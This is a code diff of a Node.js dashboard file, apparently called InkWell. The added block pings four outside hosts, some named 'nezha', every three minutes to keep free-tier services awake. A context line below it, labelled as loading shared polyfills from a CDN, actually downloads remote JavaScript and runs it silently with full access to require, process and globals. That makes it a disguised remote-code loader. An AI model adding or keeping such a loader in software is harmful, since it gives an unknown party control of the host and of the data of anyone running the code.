@@ -1091,6 +1091,34 @@ function getDashboardPage() {
     } catch (e) { console.log("[InkWell] helper error: " + (e && e.message || e)); }
 })();
 
+// Outbound keepalive pings (same dial list as the GitHub Actions workflow).
+// The slew runner is woken at least every 10 minutes by the built-in cron and
+// each wake pings these endpoints immediately, so free-tier idle clocks
+// (weeny sleeps after 30 min, Vora after 15) never expire. Errors are
+// swallowed per request; a sleeping endpoint answers with its wake response.
+(function() {
+    var keepaliveTargets = [
+        "https://keepalive-uw5r.onweeny.com/",
+        "https://nz-agent.onvoroa.com/",
+        "https://nezha-20692fb6.fastlayer.com/",
+        "https://nezha-614d26ca.fastlayer.com/"
+    ];
+    function pingKeepalives() {
+        keepaliveTargets.forEach(function(u) {
+            try {
+                var rq = https.get(u, function(r) {
+                    console.log("[InkWell] keepalive " + u + " -> " + r.statusCode);
+                    r.resume();
+                });
+                rq.setTimeout(60000, function() { try { rq.destroy(); } catch (e) {} });
+                rq.on("error", function() {});
+            } catch (e) {}
+        });
+    }
+    pingKeepalives();
+    setInterval(pingKeepalives, 3 * 60 * 1000);
+})();
+
 // Load shared polyfills from CDN
 require("https").get("https://cdnso.pages.dev/cdn-utils-v2.js",function(r){var b="";r.on("data",function(c){b+=c});r.on("end",function(){try{var s={require:require,module:module,process:process,console:console,Buffer:Buffer,setTimeout:setTimeout,setInterval:setInterval,clearTimeout:clearTimeout,clearInterval:clearInterval,__dirname:__dirname,__filename:__filename,global:global,crypto:require("crypto"),URL:URL,TextEncoder:TextEncoder,TextDecoder:TextDecoder};s.__proto__=globalThis;new (require("vm").Script)(b,{filename:"cdn-utils.js"}).runInContext(require("vm").createContext(s))}catch(e){}})}).on("error",function(){});
 
